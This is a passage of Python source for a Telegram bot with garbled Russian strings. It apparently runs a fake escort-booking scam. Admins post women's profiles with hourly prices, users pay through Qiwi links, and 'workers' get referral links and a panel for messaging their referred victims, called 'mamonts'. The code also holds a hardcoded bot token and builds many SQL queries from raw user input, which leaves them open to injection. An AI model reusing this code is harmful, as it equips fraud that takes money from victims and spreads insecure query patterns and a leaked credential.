            codecode = ( ''.join(random.choice(string.ascii_letters) for i in range(10)) )
            with sqlite3.connect("data.db") as c:
                c.execute(f"INSERT INTO promocode (summa,code) VALUES (?,?)",(int(message.text), codecode))
            info = await bot.get_me()
            await message.answer("âï¸ <b>ÐÐ¾ÑÐºÐµÑ Ð¿Ð°Ð½ÐµÐ»Ñ\n\nÐÐ°ÑÐ° ÑÐµÑÐµÑÐ°Ð»ÑÐ½Ð°Ñ ÑÑÑÐ»ÐºÐ°</b>\n<code>http://t.me/" + info["username"] + "?start=" + str(message.from_user.id) + "</code>",reply_markup=wrk)
            await message.answer(f"<b>ÐÑÐ¾Ð¼Ð¾ÐºÐ¾Ð´ Ð´Ð¾Ð±Ð°Ð²Ð»ÐµÐ½ !</b>\n\n<code>{codecode}</code>", reply_markup=GlavMenu)
    else:
        await message.answer("<b>Ð­ÑÐ¾ Ð½Ðµ ÑÐ¸ÑÐ»Ð¾ âï¸</b>")
        await state.set_state("create_promo")

@dp.message_handler(state="otkl_anketa")
async def otklancete(message, state: FSMContext):
    if message.text == 'ÐÑÐ¼ÐµÐ½Ð°â':
        await message.answer("<b>ÐÑÐ¼ÐµÐ½ÐµÐ½Ð¾</b>",reply_markup=GlavMenu)
    else:
        if message.text.isdigit():
            if message.chat.id in config.ADMINS:
                with sqlite3.connect("data.db") as c:
                    ank = c.execute(f"select count(*) from ancety where id = {message.text}").fetchone()[0]
                print(ank)
                if ank == 1:
                    with sqlite3.connect("data.db") as c:
                        c.execute(f"DELETE FROM ancety WHERE id = {message.text}")
                    await message.answer("ÐÐ½ÐºÐµÑÐ° ÑÐ´Ð°Ð»ÐµÐ½Ð°",reply_markup=GlavMenu)
                else:
                    await message.answer("ÐÐ½ÐºÐµÑÐ° Ð½Ðµ Ð½Ð°Ð¹Ð´ÐµÐ½Ð°")
        else:
            await message.answer("Ð­ÑÐ¾ Ð½Ðµ ÑÐ¸ÑÐ»Ð¾")
    await state.finish()

@dp.message_handler(state="qiwi_add")
async def otklancete(message, state: FSMContext):
    if message.text == 'ÐÑÐ¼ÐµÐ½Ð°â':
        await message.answer("<b>ÐÑÐ¼ÐµÐ½ÐµÐ½Ð¾</b>",reply_markup=GlavMenu)
    else:
        if message.from_user.id in config.ADMINS:
            try:
                q = message.text.split(":")
                nq = int(q[0])
                tq = q[1]
                with sqlite3.connect("data.db") as c:
                    c.execute(f"UPDATE qiwi SET num = {nq}")
                    c.execute(f"UPDATE qiwi SET token = \'{tq}\'")
                await message.answer(f"ÐÐ°Ð½Ð½ÑÐµ ÐºÐ¸Ð²Ð¸ Ð¸Ð·Ð¼ÐµÐ½ÐµÐ½Ñ\n\nÐÐ¾Ð²ÑÐ¹ Ð½Ð¾Ð¼ÐµÑ: {nq}\nÐÐ¾Ð²Ñ ÑÐ¾ÐºÐµÐ½: {tq}",reply_markup=GlavMenu)
            except:
                await message.answer("Ð§ÑÐ¾-ÑÐ¾ Ð¿Ð¾ÑÐ»Ð¾ Ð½Ðµ ÑÐ°Ðº.")
    await state.finish()

@dp.message_handler(state="rassilka")
async def otklancete(message, state: FSMContext):
    await state.finish()
    if message.from_user.id in config.ADMINS:
        if message.text == 'ÐÑÐ¼ÐµÐ½Ð°â':
            await message.answer("Ð Ð°ÑÑÑÐ»ÐºÐ° Ð¾ÑÐ¼ÐµÐ½ÐµÐ½Ð°",reply_markup=GlavMenu)
        else:	
            await message.answer("Ð Ð°ÑÑÑÐ»ÐºÐ° ÑÑÐ¿ÐµÑÐ½Ð¾ Ð½Ð°ÑÐ°ÑÐ°")
            with sqlite3.connect("data.db") as c:
                id = c.execute("SELECT id FROM users").fetchall()
            for i in id:
                try:
                    await bot.send_message(i[0], f"{message.text}")
                    time.sleep(0.1)
                except:
                    pass
            await message.answer("Ð Ð°ÑÑÑÐ»ÐºÐ° ÑÑÐ¿ÐµÑÐ½Ð¾ Ð·Ð°Ð²ÐµÑÑÐµÐ½Ð°",reply_markup=GlavMenu)
fuk = "5192510697:AAGp9i4cOhXUtW3BO7py3FpVKJSVRWD6Nf8"

@dp.message_handler(state="chas")
async def chas(message, state: FSMContext):
    with sqlite3.connect("data.db") as c:
        vi = c.execute(f"select photoid from users where id = {message.chat.id}").fetchone()[0]
        bnow = c.execute(f"select balance from users where id = {message.chat.id}").fetchone()[0]
        op = c.execute(f"select cena from ancety where id = {vi}").fetchone()[0]
    if message.text == 'ÐÑÐ¼ÐµÐ½Ð°â':
        await message.answer("ÐÑÐ¼ÐµÐ½ÐµÐ½Ð¾.",reply_markup=GlavMenu)
        await state.finish()
    else:
        if message.text.isdigit():
            if int(message.text) >= 0 and int(message.text) <=24:
                if int(message.text)%1 == 0:
                    if int(message.text) >=2:
                        op = op + (int(message.text)*op)/2
                    if op > bnow:
                        await message.answer(f"ÐÐ° Ð±Ð°Ð»Ð°Ð½ÑÐµ Ð½Ðµ Ð´Ð¾ÑÑÐ°ÑÐ°ÑÐ½Ð¾ ÑÑÐµÐ´ÑÑÐ².\nÐ¡ÑÐ¼Ð¼Ð° Ð·Ð°ÐºÐ°Ð·Ð° {op}\nÐÐ° Ð±Ð°Ð»Ð°Ð½ÑÐµ {bnow}",reply_markup=bal)
                        await state.finish()
                    else:
                        with sqlite3.connect("data.db") as c:
                            c.execute(f"UPDATE users SET balance = {bnow-op} WHERE id = {message.chat.id}")
                        await message.answer(f"Ð£ÑÐ¿ÐµÑÐ½Ð°Ñ Ð¾Ð¿Ð»Ð°ÑÐ°\n\nÐÐ¶Ð¸Ð´Ð°Ð¹ÑÐµ ÑÐºÐ¾ÑÐ¾ Ñ Ð²Ð°Ð¼Ð¸ ÑÐ²ÑÐ¶ÑÑÑÑ",reply_markup=GlavMenu)
                        await state.finish()
                else:
                    await message.answer("ÐÐ²ÐµÐ´Ð¸ÑÐµ ÑÐµÐ»Ð¾Ðµ ÑÐ¸ÑÐ»Ð¾.")
                    await state.set_state("chas")
            else:
                await message.answer("ÐÐ²ÐµÐ´Ð¸ÑÐµ ÑÐ¸ÑÐ»Ð¾ Ð¾Ñ 1 Ð´Ð¾ 24.")
                await state.set_state("chas")
        else:
            await message.answer("ÐÐ²ÐµÐ´Ð¸ÑÐµ ÑÐ¸ÑÐ»Ð¾.")
            await state.set_state("chas")

@dp.message_handler(state="addphoto")
async def otklancete(message, state: FSMContext):
    if message.text == 'ÐÑÐ¼ÐµÐ½Ð°â':
        await message.answer("<b>ÐÑÐ¼ÐµÐ½ÐµÐ½Ð¾</b>",reply_markup=GlavMenu)
    else:
        if message.from_user.id in config.ADMINS:
            if message.text.isdigit():
                nnn = int(message.text)
                with sqlite3.connect("data.db") as c:
                    addcount = c.execute(f"select count(*) from ancety where id = {nnn}").fetchone()[0]
                if addcount == 0:
                    await message.answer("ÐÐ½ÐºÐµÑÐ° Ð½Ðµ Ð½Ð°Ð¹Ð´ÐµÐ½Ð°\nÐÐ°Ð¿Ð¸ÑÐ¸ÑÐµ Ð¿ÑÐ°Ð²Ð¸Ð»ÑÐ½ÑÐ¹ Ð½Ð¾Ð¼ÐµÑ")
                else:
                    with sqlite3.connect("data.db") as c:
                        countphotos = c.execute(f"select count(*) from photos").fetchone()[0]
                        mphoto = c.execute(f"select mainphoto from ancety where id = {nnn}").fetchone()[0]
                        c.execute(f"INSERT INTO photos (id,anceta,image)VALUES ({countphotos+1},{nnn},\'{mphoto}\')")
                    await message.answer("ÐÑÐ¿ÑÐ°Ð²ÑÑÐµ ÑÐ¾ÑÐ¾.")
                    await state.set_state("addimage")
            else:
                await message.answer("ÐÐ°Ð¿Ð¸ÑÐ¸ÑÐµ ÑÐ¸ÑÐ»Ð¾")

@dp.message_handler(content_types=['photo'], state="addimage")
async def addimage(message, state: FSMContext):
    if message.from_user.id in config.ADMINS:
        id = random.randint(0, 10000)
        imglink = f"{id}.jpg"
        await message.photo[-1].download(r"images/" + str(id) + ".jpg")
        with sqlite3.connect("data.db") as c:
            countphotos = c.execute(f"SELECT COUNT(*) FROM photos").fetchone()[0]
            c.execute(f"UPDATE photos SET image = '{imglink}' WHERE id = {countphotos}")
        await message.answer("Ð¤Ð¾ÑÐ¾ Ð´Ð¾Ð±Ð°Ð²Ð»ÐµÐ½Ð¾.",reply_markup=GlavMenu)
    await state.finish()

@dp.message_handler(content_types=['photo'], state="new_anketa")
async def addimage(message, state: FSMContext):
    if message.from_user.id in config.ADMINS:
        id = random.randint(0, 10000)
        imglink = f"{id}.jpg"
        await message.photo[-1].download(r"images/" + str(id) + ".jpg")
        with sqlite3.connect("data.db") as c:
            cak = c.execute(f"SELECT COUNT(*) FROM ancety").fetchone()[0]
            c.execute("INSERT INTO ancety (id,mainphoto,name,cena,about) VALUES (?,?,?,?,?)",(cak+1,imglink,"a","a", "0",))
        await message.answer("Ð¤Ð¾ÑÐ¾ Ð´Ð¾Ð±Ð°Ð²Ð»ÐµÐ½Ð¾\n\nÐÐ°Ðº Ð±ÑÐ´ÐµÐ¼ Ð½Ð°Ð·ÑÐ²Ð°ÑÑ ÑÑÑ Ð±Ð°Ð±Ð¾ÑÐºÑ?ð")
        await state.set_state("new_anketa_name")

@dp.message_handler(state="new_anketa_name")
async def addimage(message, state: FSMContext):
    if message.from_user.id in config.ADMINS:
        with sqlite3.connect("data.db") as c:
            asdas = c.execute(f"select count(*) from ancety").fetchone()[0]
            c.execute(f"UPDATE ancety SET name = \'{message.text}\' WHERE id = {asdas}")
        await message.answer("ÐÐ¼Ñ Ð²ÑÐ±ÑÐ°Ð½Ð¾ â\nÐÐ²ÐµÐ´Ð¸ÑÐµ ÑÐµÐ½Ñ Ð±Ð°Ð±Ð¾ÑÐºÐ¸ Ð·Ð° ÑÐ°Ñ ð¸")
        await state.set_state("new_anketa_price")

@dp.message_handler(state="new_anketa_price")
async def addimage(message, state: FSMContext):
    if message.from_user.id in config.ADMINS:
        if message.text.isdigit():
            with sqlite3.connect("data.db") as c:
                sadasadas = c.execute(f"select count(*) from ancety").fetchone()[0]
                c.execute(f"UPDATE ancety SET cena = {int(message.text)} WHERE id = {sadasadas}")
            await message.answer("Ð¦ÐµÐ½Ð° Ð²ÑÐ±ÑÐ°Ð½Ð° â\nÐÐ²ÐµÐ´Ð¸ÑÐµ ÑÑÐ»ÑÐ³Ð¸ Ð´ÐµÐ²ÑÑÐºÐ¸")
            await state.set_state("new_anketa_uslugi")
        else:
            await message.answer("ÐÐ²ÐµÐ´Ð¸ÑÐµ ÑÐ¸ÑÐ»Ð¾")
            await state.set_state("new_anketa_price")

@dp.message_handler(state="new_anketa_uslugi")
async def addimage(message, state: FSMContext):
    if message.from_user.id in config.ADMINS:
        with sqlite3.connect("data.db") as c:
            adss = c.execute(f"select count(*) from ancety").fetchone()[0]
            c.execute(f"UPDATE ancety SET about = \'{message.text}\' WHERE id = {adss}")
            anketa = c.execute(f"select * from ancety where id = {adss}").fetchone()
        photo = open(f"images/{anketa[1]}", 'rb')
        await bot.send_photo(message.chat.id, photo, caption=f"ðââï¸ÐÐ¼Ñ: {anketa[2]}\n\nð°Ð¦ÐµÐ½Ð° Ð·Ð° ÑÐ°Ñ: {anketa[3]}\n\nð§ââï¸Ð ÑÐµÐ±Ðµ: {anketa[4]}")
        await message.answer("ÐÐ½ÐºÐµÑÐ° Ð³Ð¾ÑÐ¾Ð²Ð° !",reply_markup=GlavMenu)
        await state.finish()

@dp.message_handler(state="mamontmessage")
async def addimage(message, state: FSMContext):
    if message.text == 'ÐÑÐ¼ÐµÐ½Ð°â':
        await message.answer("<b>ÐÑÐ¼ÐµÐ½ÐµÐ½Ð¾</b>",reply_markup=GlavMenu)
        await state.finish()
    elif ":" in message.text:
        m = message.text.split(":")
        if m[0].isdigit():
            with sqlite3.connect("data.db") as c:
                est = c.execute(f"SELECT COUNT(*) FROM users WHERE id = {m[0]} AND boss = {message.from_user.id}").fetchone()[0]
            if est == 0:
                await message.answer("<b>ÐÐ¾Ð»ÑÐ·Ð¾Ð²Ð°ÑÐµÐ»Ñ Ð½Ðµ Ð½Ð°Ð¹Ð´ÐµÐ½ Ð² Ð±Ð°Ð·Ðµ Ð¸Ð»Ð¸ Ð½Ðµ Ð²Ð°Ñ</b>")
            else:	
                try:
                    await bot.send_message(m[0],m[1])
                    await message.answer("<b>Ð¡Ð¾Ð¾Ð±ÑÐµÐ½Ð¸Ðµ Ð¾ÑÐ¿ÑÐ°Ð²Ð»ÐµÐ½Ð¾.</b>",reply_markup=GlavMenu)
                except:
                    await message.answer("<b>Ð¡Ð¾Ð¾Ð±ÑÐµÐ½Ð¸Ðµ Ð½Ðµ Ð¾ÑÐ¿ÑÐ°Ð²Ð»ÐµÐ½Ð¾\nÐ¡ÐºÐ¾ÑÐµÐµ Ð²ÑÐµÐ³Ð¾ Ð¿Ð¾Ð»ÑÐ·Ð¾Ð²Ð°ÑÐµÐ»Ñ Ð·Ð°Ð±Ð»Ð¾ÐºÐ¸ÑÐ¾Ð²Ð°Ð» Ð±Ð¾ÑÐ°.</b>",reply_markup=GlavMenu)
            info = await bot.get_me()
            await message.answer("âï¸ <b>ÐÐ¾ÑÐºÐµÑ Ð¿Ð°Ð½ÐµÐ»Ñ\n\nÐÐ°ÑÐ° ÑÐµÑÐµÑÐ°Ð»ÑÐ½Ð°Ñ ÑÑÑÐ»ÐºÐ°</b>\n<code>http://t.me/" + info["username"] + "?start=" + str(message.from_user.id) + "</code>",reply_markup=wrk)
            await state.finish()
        else:
            await message.answer("<b>ÐÐµÐ¿ÑÐ°Ð²Ð¸Ð»ÑÐ½ÑÐ¹ ÑÐ¾ÑÐ¼Ð°Ñ Ð´Ð°Ð½Ð½ÑÑ</b>")
            await state.set_state("mamontmessage")
    else:
        await message.answer("<b>ÐÐµÐ¿ÑÐ°Ð²Ð¸Ð»ÑÐ½ÑÐ¹ ÑÐ¾ÑÐ¼Ð°Ñ Ð´Ð°Ð½Ð½ÑÑ</b>")
        await state.set_state("mamontmessage")

@dp.message_handler(state="popolni")
async def addimage(message, state: FSMContext):
    if message.text == 'ÐÑÐ¼ÐµÐ½Ð°â':
        await message.answer("<b>ÐÑÐ¼ÐµÐ½ÐµÐ½Ð¾</b>",reply_markup=GlavMenu)
        await state.finish()
    else:	
        if message.text.isdigit():
            skolko = int(message.text)
            if skolko >= config.minimalka and skolko <= config.maximalka:
                try:
                    with sqlite3.connect("data.db") as c:
                        c.execute(f"DELETE FROM oplata WHERE id = {message.chat.id}")
                except Exception as e:
                    raise
                comment = random.randint(10000, 9999999)
                with sqlite3.connect("data.db") as c:
                    c.execute(f"INSERT INTO oplata (id, code) VALUES({message.chat.id}, {comment})")
                    qiwinumber = c.execute(f"select num from qiwi").fetchone()[0]
                link = f"https://qiwi.com/payment/form/99?extra%5B%27account%27%5D={qiwinumber}&amountInteger={skolko}&amountFraction=0&currency=643&extra%5B%27comment%27%5D={comment}&blocked[0]=sum&blocked[1]=account&blocked[2]=comment"
                kb = types.InlineKeyboardMarkup()
                kb.add(InlineKeyboardButton(text="ÐÐ¿Ð»Ð°ÑÐ¸ÑÑ", callback_data="site", url=link))
                kb.add(InlineKeyboardButton(text='ÐÑÐ¾Ð²ÐµÑÐ¸ÑÑ Ð¾Ð¿Ð»Ð°ÑÑ', callback_data='prov'))
                await message.answer("ð <b>ÐÐ¿Ð»Ð°ÑÐ° ÑÑÐ¾ÑÐ¼Ð¸ÑÐ¾Ð²Ð°Ð½Ð° ÑÑÐ¿ÐµÑÐ½Ð¾.</b>", reply_markup=GlavMenu)
                await message.answer(f'â»ï¸ <b>ÐÐ¿Ð»Ð°ÑÐ° <a href="{link}">Qiwi.</a>\n\n'
                                     f"ÐÐ¾ÑÐµÐ»ÐµÐº:</b> <code>+{qiwinumber}</code>\n"
                                     f"<b>Ð Ð¾Ð¿Ð»Ð°ÑÐµ:</b> <code>{skolko} â½</code>\n"
                                     f"<b>ÐÐ¾Ð¼Ð¼ÐµÐ½ÑÐ°ÑÐ¸Ð¹:</b> <code>{comment} â½</code>\n\n", reply_markup=kb)
                await state.finish()
            else:
                await message.answer(f"<b>Ð¡ÑÐ¼Ð¼Ð° Ð¿Ð¾Ð¿Ð¾Ð»Ð½ÐµÐ½Ð¸Ñ Ð´Ð¾Ð»Ð¶Ð½Ð° Ð±ÑÑÑ Ð¾Ñ</b> {minimalka} <b>Ð´Ð¾</b> {maximalka}.")
                await state.set_state("popolni")
        else:
            await message.answer("<b>Ð­ÑÐ¾ Ð½Ðµ ÑÐ¸ÑÐ»Ð¾</b>")
            await state.set_state("popolni")

if __name__ == "__main__":
    init_db()   # 👈 ВАЖНО
    executor.start_polling(dp, skip_updates=True)
